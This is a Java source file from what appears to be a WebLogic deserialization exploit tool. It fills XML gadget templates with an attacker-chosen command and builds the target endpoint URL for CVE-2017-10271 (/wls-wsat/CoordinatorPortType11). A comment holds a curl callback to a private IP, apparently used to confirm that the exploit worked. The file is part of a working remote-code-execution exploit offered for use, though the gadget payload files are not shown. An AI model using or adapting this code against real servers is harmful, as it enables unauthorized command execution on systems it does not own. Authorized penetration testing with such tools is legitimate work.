package unserWeblogic.utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

public class PayloadGenerator {
    public static String XMLPayloadGenerator(String gadget, String type, String cmdLine) {
        String payload = readFileContent("src/main/java/unserWeblogic/gadgets/" + gadget + ".xml");
        if(type.equals("cmd") && cmdLine != null){
            payload = payload.replace("{cmdline}", cmdLine);
        }
        // curl http://192.168.21.131/success
        return payload;
    }


    public static String XMLPayloadGenerator(String gadget, String type) {
        return XMLPayloadGenerator(gadget, type, null);
    }

    public static String readFileContent(String fileName) {
        File file = new File(fileName);
        BufferedReader reader = null;
        StringBuffer sbf = new StringBuffer();
        try {
            reader = new BufferedReader(new FileReader(file));
            String tempStr;
            while ((tempStr = reader.readLine()) != null) {
                sbf.append(tempStr);
            }
            reader.close();
            return sbf.toString();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
        }
        return sbf.toString();
    }

    public static String UrlGenerator(String gadget, String host, String port) {
        String path = "";
        if(gadget.equals("CVE_2017_10271")){
            path += "/wls-wsat/CoordinatorPortType11";
        }
        return "http://" + host + ":" + port + path;
    }

}
